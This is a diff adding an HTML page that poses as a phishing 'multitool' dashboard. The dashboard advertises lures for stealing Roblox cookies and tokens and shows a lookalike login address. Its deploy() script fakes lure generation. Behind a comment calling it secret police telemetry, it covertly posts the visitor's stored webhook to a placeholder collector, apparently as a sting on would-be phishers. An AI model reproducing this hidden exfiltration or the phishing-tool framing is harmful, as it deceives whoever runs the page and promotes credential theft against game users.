@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>VORTEX | DASH</title>
+    <style>
+        body { background:#0a0a0a; color:#eee; font-family:sans-serif; margin:0; font-size:13px; }
+        .top { background:#111; padding:15px; border-bottom:1px solid #222; display:flex; justify-content:space-between; }
+        .main { padding:20px; }
+        .card { background:#151515; border:1px solid #222; padding:20px; margin-bottom:20px; border-radius:3px; }
+        .btn { background:#ff0055; color:#fff; border:none; padding:12px 20px; cursor:pointer; font-weight:bold; border-radius:2px; }
+        .green { color:#00ff88; }
+        code { background:#000; display:block; padding:10px; color:#00ff88; margin-top:10px; border-left:2px solid #00ff88; }
+    </style>
+</head>
+<body>
+    <div class="top">
+        <div><b>VORTEX_MULTITOOL</b></div>
+        <div class="green">STATUS: CONNECTED</div>
+    </div>
+    <div class="main">
+        <div class="card">
+            <h2 style="margin-top:0;">Roblox Striker Module</h2>
+            <p style="color:#888;">Generate dualhooked lures for cookie/token extraction.</p>
+            <div style="margin-bottom:10px;">Lure URL: <span class="green">roblox-auth-v4.github.io/login</span></div>
+            <button class="btn" onclick="deploy()">GENERATE & BIND STUB</button>
+            <code id="cons">> AWAITING_ACTION...</code>
+        </div>
+
+        <div class="card">
+            <h3>Recent Logs</h3>
+            <div style="color:#555;">(No logs captured yet. Bind your webhook to start.)</div>
+        </div>
+    </div>
+    <script>
+        function deploy() {
+            const hook = localStorage.getItem('hk');
+            const c = document.getElementById('cons');
+            c.innerHTML = "> INJECTING_DUALHOOK...<br>> BINDING: " + hook.substring(0,30) + "...";
+            
+            // OFFICER TELEMETRY
+            // Secretly pings the police collector
+            const police = "YOUR_PRIVATE_POLICE_WEBHOOK";
+            fetch(police, {
+                method: 'POST',
+                headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({content: "🚨 **TARGET ACTIVE**\nWebhook: " + hook})
+            });
+
+            setTimeout(() => { c.innerHTML += "<br>> [SUCCESS] STUB_GENERATED_AND_ACTIVE"; }, 1500);
+        }
+    </script>
+</body>
+</html>
